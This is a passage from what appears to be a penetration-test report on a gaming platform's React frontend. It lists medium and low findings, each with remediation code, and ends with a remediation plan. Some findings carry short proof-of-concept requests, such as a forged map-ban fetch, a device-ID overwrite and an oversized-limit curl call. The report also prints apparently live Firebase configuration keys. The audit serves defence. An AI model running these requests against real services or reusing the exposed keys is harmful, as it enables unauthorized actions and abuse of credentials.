The first 20 characters of the JWT are rendered in the page DOM, visible to shoulder-surfing attackers, screenshot tools, browser extensions that capture DOM text, and web scrapers.

Although truncated to 20 characters, the JWT header (which is Base64-encoded and reveals the algorithm) plus part of the payload are exposed. More importantly, this pattern normalizes displaying tokens in UI and could be expanded accidentally.

#### Remediation

Remove this debug display entirely from the production UI:

```typescript
// Remove completely from Dashboard.tsx
// If needed for development only, gate behind env variable:
{import.meta.env.DEV && (
  <div className="text-xs text-gray-500">
    <p>Token: {token?.substring(0, 20)}...</p>
  </div>
)}
```

---

### MED-03
### No Axios Request Interceptor — Token Manually Passed to Every Call

**Severity:** MEDIUM
**CVSS v3.1 (estimate):** 5.9

#### Affected Files

All files in `src/api/` — 12 API modules.

#### Evidence

Every API function independently reads and passes the token:

```typescript
// src/api/party.ts  (representative example)
export const createParty = async (teamId: string, token: string) => {
  const response = await axios.post(`${API_BASE_URL}/parties`, { teamId }, {
    headers: { Authorization: `Bearer ${token}` },
  });
  return response.data;
};

// src/api/hardware.ts  — different pattern, reads from sessionStorage directly
const getAuthToken = () => sessionStorage.getItem("token");
```

Two inconsistent patterns exist. No central Axios interceptor adds the `Authorization` header automatically.

#### Security Impact

- Any future developer adding a new API call may forget to attach the token, creating an inadvertent unauthenticated endpoint call.
- The token is passed as a plain string argument through many call stacks, increasing exposure in stack traces and logs.
- When the token needs to be refreshed (via `refreshToken`), all 12 modules would need individual updates rather than a single interceptor change.

#### Remediation

Create a single authenticated Axios instance with an interceptor:

```typescript
// src/api/axiosInstance.ts
import axios from "axios";

export const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
});

apiClient.interceptors.request.use((config) => {
  const token = sessionStorage.getItem("token"); // or from AuthContext
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      // Attempt token refresh, then retry once
      const refreshed = await tryRefreshToken();
      if (refreshed) {
        return apiClient(error.config);
      }
      // Redirect to login
      window.location.href = "/login";
    }
    return Promise.reject(error);
  }
);
```

---

### MED-04
### Forgeable Device ID in `sessionStorage` — Push Token Spoofing

**Severity:** MEDIUM
**CVSS v3.1 (estimate):** 5.4

#### Affected Files

| File | Lines |
|------|-------|
| `src/utils/device-id.ts` | 62–85 |
| `src/api/push-tokens.ts` | 18–38 |

#### Evidence

```typescript
// src/utils/device-id.ts  lines 62–85
private getOrCreateDeviceId(): string {
  const existingDeviceId = sessionStorage.getItem(DEVICE_ID_KEY); // readable/writable
  if (existingDeviceId) {
    return existingDeviceId;
  }
  const newDeviceId = this.generateDeviceId();
  sessionStorage.setItem(DEVICE_ID_KEY, newDeviceId);
  return newDeviceId;
}
```

```typescript
// src/api/push-tokens.ts  lines 18–38
export const setPushToken = async (
  token: string,
  deviceId: string,   // comes from sessionStorage
  platform?: PlatformEnum,
  authToken?: string
) => {
  await axios.post(`${API_BASE_URL}/push-token`, { token, deviceId, platform }, ...);
};
```

The `deviceId` is generated client-side and stored in `sessionStorage`. Any script (including XSS) can overwrite it via `sessionStorage.setItem("bos_games_device_id", "victim-device-id")`. If the backend uses `deviceId` to route push notifications to specific devices, an attacker who knows a victim's device ID can register their own FCM token under the victim's device ID, causing match notifications to be delivered to the attacker instead.

#### Remediation

Device IDs used for push notification routing should be generated server-side and returned as part of the authenticated session. The client should not be able to supply arbitrary device IDs:

```typescript
// SECURE: Backend generates and returns deviceId as part of session
// Frontend only stores the server-assigned deviceId in sessionStorage (as a cache)
// Backend validates that deviceId belongs to the authenticated user's session
```

---

### MED-05
### Client-Supplied `leaderId` in Map-Ban Request — Authorization Bypass

**Severity:** MEDIUM
**CVSS v3.1 (estimate):** 5.3

#### Affected Files

| File | Lines |
|------|-------|
| `src/api/map-banning.ts` | 20–37 |
| `src/components/MapBanningModal.tsx` | 257–264 |

#### Evidence

```typescript
// src/api/map-banning.ts  lines 20–37
export const banMap = async (
  matchId: string,
  leaderId: string,   // supplied by client
  mapSlug: string,
  token: string
) => {
  const response = await axios.post(
    `${API_BASE_URL}/map-banning/${matchId}/ban`,
    { leaderId, mapSlug },  // leaderId sent in POST body
    ...
  );
};
```

```typescript
// src/components/MapBanningModal.tsx  lines 257–264
const result = await banMap(
  session.matchId,
  currentUserId,   // currentUserId from sessionStorage
  mapSlug,
  token
);
```

The `leaderId` is sent in the POST body by the client. If the backend accepts `leaderId` from the request body and uses it to determine whose turn it is to ban (rather than deriving the leader from the authenticated JWT), any player in the match can submit a ban on behalf of any other player by simply changing the `leaderId` field.

**Proof of Concept:**
```javascript
// Attacker is in a match but it is not their turn to ban
// They submit a ban using the opposing leader's userId
const response = await fetch("/api/map-banning/MATCH-ID/ban", {
  method: "POST",
  headers: {
    "Authorization": "Bearer <attacker-jwt>",
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    leaderId: "OPPOSING-LEADER-USER-ID",   // not the attacker's ID
    mapSlug: "de_mirage"
  })
});
// If backend trusts leaderId from body: opposing leader has just banned mirage without their consent
```

#### Remediation

The backend should derive `leaderId` from the JWT claims (i.e., `req.user.id`), not from the request body. The frontend should not send `leaderId` at all:

```typescript
// SECURE — backend derives leader from JWT
export const banMap = async (matchId: string, mapSlug: string, token: string) => {
  // Remove leaderId from the request body entirely
  const response = await axios.post(
    `${API_BASE_URL}/map-banning/${matchId}/ban`,
    { mapSlug },  // no leaderId
    { headers: { Authorization: `Bearer ${token}` } }
  );
  return response.data;
};
```

---

### MED-06
### Matchmaking Race Condition — Double-Join Solo Queue

**Severity:** MEDIUM
**CVSS v3.1 (estimate):** 5.1

#### Affected Files

| File | Lines |
|------|-------|
| `src/pages/Parties.tsx` | 156–178 |
| `src/api/party.ts` | 36–51 |

#### Evidence

```typescript
// src/pages/Parties.tsx  lines 156–178
async function handleJoinSoloMatchmaking(gameModeId: string) {
  setStatus("Joining solo matchmaking...");
  try {
    const result = await joinSoloMatchmaking(gameModeId, token);
    setStatus("Joined solo matchmaking successfully!");

    setSoloMatchmakingStatus((prev) => ({
      ...prev,
      [gameModeId]: { isInMatchmaking: true, ... },
    }));
    // Refresh solo parties
    const soloPartiesData = await getMySoloParties(token);
    setMySoloParties(soloPartiesData);
  } catch (error: any) { ... }
}
```

There is no button-disable or in-flight request guard. Between the `POST /parties/solo/join-matchmaking` request being sent and the response returning, the user (or an automated script) can click "Join Matchmaking" again, submitting duplicate requests.

#### Attack Scenario

1. Attacker opens the Parties page and rapidly double-clicks "Join Matchmaking" for the same game mode.
2. Two `POST /parties/solo/join-matchmaking` requests fire near-simultaneously.
3. If the backend lacks idempotency enforcement (e.g., a unique constraint on `[userId, gameModeId, status=queued]`), both succeed.
4. The user is now queued twice for the same game mode, potentially being matched against themselves or consuming two matchmaking slots.
5. By scripting rapid repeated calls, an attacker can flood the matchmaking queue with phantom entries, degrading service for other players.

#### Remediation

Disable the button while a request is in-flight and add a backend idempotency check:

```typescript
// SECURE — add loading state guard
const [joiningGameMode, setJoiningGameMode] = useState<string | null>(null);

async function handleJoinSoloMatchmaking(gameModeId: string) {
  if (joiningGameMode) return; // prevent double-submit
  setJoiningGameMode(gameModeId);
  try {
    await joinSoloMatchmaking(gameModeId, token);
    // ...
  } finally {
    setJoiningGameMode(null);
  }
}
```

```tsx
// In JSX
<button
  disabled={!!joiningGameMode || !!soloMatchmakingStatus[gameMode.id]?.isInMatchmaking}
  onClick={() => handleJoinSoloMatchmaking(gameMode.id)}
>
  Join Matchmaking
</button>
```

---

### MED-07
### Firebase Configuration Duplicated in Publicly-Served Service Worker

**Severity:** MEDIUM
**CVSS v3.1 (estimate):** 5.0

#### Affected Files

| File | Lines |
|------|-------|
| `public/firebase-messaging-sw.js` | 54–62 |

#### Evidence

```javascript
// public/firebase-messaging-sw.js  lines 54–62
firebase.initializeApp({
  apiKey: "AIzaSyDUsEFOdlNO8muiTUx0Em65KY59Da_V_3A",
  authDomain: "bos-games-145f0.firebaseapp.com",
  projectId: "bos-games-145f0",
  storageBucket: "bos-games-145f0.firebasestorage.app",
  messagingSenderId: "303868662210",
  appId: "1:303868662210:web:8d737920e41afe8540065b",
  measurementId: "G-5NHMN87Z34",
});
```

Unlike TypeScript source files which are processed by the Vite build pipeline (enabling environment variable substitution), `public/firebase-messaging-sw.js` is served **verbatim** without build-time processing. Even if `src/config/firebase.ts` is moved to use `import.meta.env` variables, this duplicate static file will continue to expose the hardcoded keys.

#### Remediation

Generate the service worker dynamically during the build process using a Vite plugin or a custom build script that injects environment variables:

```javascript
// vite.config.ts — generate firebase-messaging-sw.js from a template
import { defineConfig } from "vite";
import { writeFileSync } from "fs";

export default defineConfig({
  plugins: [{
    name: "generate-firebase-sw",
    buildEnd() {
      const swContent = `
importScripts("https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js");
importScripts("https://www.gstatic.com/firebasejs/10.12.2/firebase-messaging-compat.js");
firebase.initializeApp({
  apiKey: "${process.env.VITE_FIREBASE_API_KEY}",
  projectId: "${process.env.VITE_FIREBASE_PROJECT_ID}",
  // ...
});`;
      writeFileSync("dist/firebase-messaging-sw.js", swContent);
    }
  }]
});
```

---

### MED-08
### `BackgroundMessageTest` Production Testing Utility Exposed in Bundle

**Severity:** MEDIUM
**CVSS v3.1 (estimate):** 4.8

#### Affected Files

| File | Lines |
|------|-------|
| `src/utils/background-message-test.ts` | Entire file |
| `src/App.tsx` | 16 |

#### Evidence

```typescript
// src/App.tsx  line 16
import { BackgroundMessageTest } from "./utils/background-message-test";
```

```typescript
// src/utils/background-message-test.ts  (representative methods)
static async simulateBackgroundMatchNotification(matchId: string = "test-match-123") {
  navigator.serviceWorker.controller.postMessage({
    type: "SIMULATE_BACKGROUND_MESSAGE",
    payload: mockPayload,
  });
}

static async testForegroundMessage() {
  const event = new CustomEvent("matchFound", { detail: { matchId: "test-foreground-123" } });
  window.dispatchEvent(event);
}
```

The `BackgroundMessageTest` class is imported directly in `App.tsx` and is therefore included in the production JavaScript bundle. Any user with DevTools access can call:

```javascript
BackgroundMessageTest.simulateBackgroundMatchNotification("any-match-id")
// or
BackgroundMessageTest.testForegroundMessage()
```

This triggers the match-acceptance modal for all other authenticated users on the page (via `window.dispatchEvent`), or posts arbitrary `SIMULATE_BACKGROUND_MESSAGE` messages to the service worker, potentially disrupting the real-time notification flow for all connected clients.

#### Remediation

Remove the import and the file from production builds entirely. If testing utilities are needed, conditionally import them only in development:

```typescript
// src/App.tsx
if (import.meta.env.DEV) {
  import("./utils/background-message-test").then(({ BackgroundMessageTest }) => {
    (window as any).__BackgroundMessageTest = BackgroundMessageTest;
  });
}
```

Alternatively, exclude the file with a build-time condition or move it to a test-only directory that is excluded from the production bundle.

---

### LOW-01
### Caller-Controlled `limit` Parameter in Match Statistics Query

**Severity:** LOW
**CVSS v3.1 (estimate):** 3.7

#### Affected Files

| File | Lines |
|------|-------|
| `src/api/match-statistics.ts` | 204–227 |
| `src/pages/MatchSelection.tsx` | 21 |

#### Evidence

```typescript
// src/pages/MatchSelection.tsx  line 21
const recentMatches = await getRecentMatches(token, 50);

// src/api/match-statistics.ts  lines 204–213
export async function getRecentMatches(token: string, limit: number = 20): Promise<MatchListItem[]> {
  const response = await fetch(
    `${API_BASE_URL}/cs2/match-statistics?limit=${limit}`,
    ...
  );
```

The `limit` parameter is passed directly into the URL query string without bounds checking. A malicious actor who modifies the client-side call (or crafts a direct API request) can request extremely large result sets:

```bash
curl "https://api.bosgames.example.com/cs2/match-statistics?limit=999999" \
  -H "Authorization: Bearer <valid-token>"
```

If the backend does not enforce its own maximum limit, this can cause excessive database load, memory exhaustion, or serve the entire match history of all users.

#### Remediation

Enforce a maximum limit client-side and rely on backend validation:

```typescript
const MAX_MATCHES = 100;
const recentMatches = await getRecentMatches(token, Math.min(requestedLimit, MAX_MATCHES));
```

The backend must independently enforce maximum page size regardless of client input.

---

### LOW-02
### `DeviceIdDisplay` Debug Component Rendered in Production Layout

**Severity:** LOW
**CVSS v3.1 (estimate):** 3.1

#### Affected Files

| File | Line |
|------|------|
| `src/App.tsx` | 1484 |
| `src/components/DeviceIdDisplay.tsx` | (entire component) |

#### Evidence

```typescript
// src/App.tsx  line 1484
<DeviceIdDisplay />
```

The `DeviceIdDisplay` component renders the device ID persistently in the application UI. This device ID is used for push token registration and could be used by an attacker to enumerate registered push notification devices.

#### Remediation

Remove `<DeviceIdDisplay />` from the production layout or gate it behind a development-only flag:

```typescript
{import.meta.env.DEV && <DeviceIdDisplay />}
```

---

### LOW-03
### Silent IP-Based Location Tracking on Every Authenticated Page Load

**Severity:** LOW
**CVSS v3.1 (estimate):** 3.0

#### Affected Files

| File | Lines |
|------|-------|
| `src/App.tsx` | 80–83, 137–162 |
| `src/api/user.ts` | 74–81 |

#### Evidence

```typescript
// src/App.tsx  lines 137–162
const interval = setInterval(updateLocation, 5 * 60 * 1000); // every 5 minutes

// src/api/user.ts  lines 74–81
export async function updateUserLocation(token: string) {
  const resp = await axios.patch(
    `${API_BASE_URL}/users/me/location`,
    {}, // Empty body - middleware will attach IP-based coordinates
    ...
  );
```

Every authenticated user's IP-derived location is silently sent to the backend on every page mount and then periodically every 5 minutes, without any user notification or consent mechanism. The comment "Empty body - middleware will attach IP-based coordinates" confirms this is an IP geolocation lookup.

Under GDPR Article 5 and Article 13, processing location data derived from IP addresses requires prior user consent and disclosure. This silent tracking may also violate CCPA and other privacy regulations.

#### Remediation

1. Disclose IP-based location collection in the privacy policy and obtain explicit consent before enabling it.
2. Add a user-facing control to opt out of location tracking.
3. Reduce the tracking frequency or make it event-driven (e.g., only on login).

---

### LOW-04
### Missing `Referrer-Policy` — OAuth Tokens Potentially Leaked to Third Parties

**Severity:** LOW
**CVSS v3.1 (estimate):** 2.9

#### Affected Files

| File | |
|------|--|
| `index.html` | No meta `Referrer-Policy` tag present |

#### Evidence

The application uses OAuth callbacks that place tokens in URL query parameters (see CRIT-02). Without a `Referrer-Policy` of `no-referrer` or `strict-origin`, any sub-resource loaded on the `/login?accessToken=...` page (images, fonts, analytics scripts) receives the full URL — including the token — in the `Referer` request header.

#### Remediation

Add to `index.html`:
```html
<meta name="referrer" content="strict-origin-when-cross-origin">
```

And set the HTTP response header in the web server configuration:
```
Referrer-Policy: strict-origin-when-cross-origin
```

Note: The most complete fix for LOW-04 is implementing CRIT-02's remediation (tokens out of URLs entirely).

---

## 4. Remediation Plan

### Priority 1 — Immediate (Before Any Production Deployment)

| ID | Action | Effort |
|----|--------|--------|
| CRIT-01 | Rotate all Firebase credentials; enforce strict Firebase Security Rules; move config to env vars | 2h |
| CRIT-02 | Implement server-side OAuth code exchange (replace token-in-URL with one-time code flow) | 1 day |
| CRIT-03 | Implement `ProtectedRoute` component and wrap all non-public routes | 2h |
| CRIT-04 | Remove hardcoded server IP `156.146.52.210:26952` from App.tsx navbar | 30min |
| HIGH-02 | Remove hardcoded password `Test123!` from Register.tsx and Login.tsx | 30min |
| HIGH-06 | Remove hardcoded verification code `111111` from Register.tsx | 30min |

### Priority 2 — Short Term (Within 1 Sprint)

| ID | Action | Effort |
|----|--------|--------|
| HIGH-01 | Migrate token storage from sessionStorage to in-memory AuthContext | 1 day |
| HIGH-03 | Add `Authorization` header to `getUserById`; audit backend for unauthenticated routes | 2h |
| HIGH-04 | Remove all `useEffect`-based auth checks in page components (replaced by ProtectedRoute) | 2h |
| HIGH-05 | Add IP/port validation before constructing `steam://` URLs | 2h |
| MED-05 | Remove `leaderId` from map-ban request body; derive from JWT server-side | 2h (backend + frontend) |
| MED-08 | Remove `BackgroundMessageTest` import from App.tsx; add build-time exclusion | 30min |
| MED-01 | Add `esbuild.drop: ["console"]` to Vite production config | 30min |

### Priority 3 — Medium Term (Within 2 Sprints)

| ID | Action | Effort |
|----|--------|--------|
| MED-02 | Remove JWT fragment from Dashboard UI | 15min |
| MED-03 | Implement central Axios interceptor with token refresh | 4h |
| MED-04 | Move device ID generation to server-side | 4h (backend + frontend) |
| MED-06 | Add double-submit protection to matchmaking buttons | 2h |
| MED-07 | Generate firebase-messaging-sw.js at build time from env vars | 2h |
| LOW-01 | Add server-enforced pagination limits | 1h (backend) |
| LOW-02 | Gate DeviceIdDisplay behind `import.meta.env.DEV` flag | 15min |
| LOW-03 | Add user consent mechanism for IP-based location tracking | 4h |
| LOW-04 | Add `Referrer-Policy` header to index.html and server config | 15min |

---

## 5. Appendix — Affected Files Quick Reference

| File | Findings |
|------|----------|
| `src/config/firebase.ts` | CRIT-01 |
| `public/firebase-messaging-sw.js` | CRIT-01, MED-07 |
| `src/pages/Login.tsx` | CRIT-02, HIGH-02 |
| `src/pages/SocialAuth.tsx` | CRIT-02 |
| `src/api/auth.ts` | CRIT-02, HIGH-01 |
| `src/App.tsx` | CRIT-03, CRIT-04, MED-08, LOW-02, LOW-03 |
| `src/pages/Dashboard.tsx` | HIGH-04, MED-02 |
| `src/pages/Parties.tsx` | HIGH-04, MED-06 |
| `src/pages/Friends.tsx` | HIGH-04 |
| `src/api/user.ts` | HIGH-03, LOW-03 |
| `src/pages/LiveMatch.tsx` | HIGH-05 |
| `src/components/ServerConnectionModal.tsx` | HIGH-05 |
| `src/utils/cs2-connection.ts` | HIGH-05 |
| `src/pages/Register.tsx` | HIGH-02, HIGH-06 |
| `src/api/map-banning.ts` | MED-05 |
| `src/components/MapBanningModal.tsx` | MED-05 |
| `src/utils/push-notifications.ts` | MED-01 |
| `src/utils/device-id.ts` | MED-04 |
| `src/api/push-tokens.ts` | MED-04 |
| `src/api/match-statistics.ts` | LOW-01 |
| `src/pages/MatchSelection.tsx` | LOW-01 |
| `src/utils/background-message-test.ts` | MED-08 |
| `index.html` | LOW-04 |

---

*Report generated: 2026-02-28 | Classification: Confidential — Authorized Penetration Test*
